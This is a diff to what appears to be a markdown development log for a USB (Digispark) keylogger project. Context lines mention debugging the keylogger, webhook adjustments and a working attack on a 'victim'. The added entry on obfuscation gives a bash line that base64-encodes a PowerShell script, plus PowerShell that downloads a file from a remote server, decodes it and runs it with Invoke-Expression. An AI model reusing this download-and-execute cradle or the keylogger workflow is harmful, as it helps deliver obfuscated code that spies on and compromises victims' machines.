@@ -1323,6 +1323,7 @@ exit(0);
 
 **Profit!**
 
+---
 ### 16.11.2023
 *Debugging and fixing the keylogger*
 
@@ -1458,6 +1459,7 @@ And outcome:
 
 **Working like it should, again, and for now...**
 
+---
 ### 20.11.2023
 *Webhook adjustments*
 
@@ -1504,3 +1506,33 @@ And when plugged in to victim, that has the Digispark blocked by PID and VID:
 
 **Boom! Working!**
 
+---
+#### 27.11.2023
+*Obfuscation*
+
+Yesterday we demostrated a small Hello World powershell scrip obfuscated with base64.
+
+Just putting the notes here, to share and remember:   
+
+
+Linux side, encode with base64, to powershell readable format.
+```bash
+echo $(cat hello.ps1) | iconv --to-code UTF-16LE | base64 -w 0
+```
+
+
+- Get the file from server
+- Assign the raw content of the file to a variable.
+- Decode and assign the decoded content to a variable
+- Run the decoded content
+```powershell
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.66.2/c2VydmVy/hello_mess.ps1', "$env:Temp\\hello_mess.ps1")
+
+$Script = Get-Content -Path $env:Temp\\hello_mess.ps1 -Raw
+
+$DecodedScript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Script))
+
+Invoke-Expression $DecodedScript
+```
+
+---
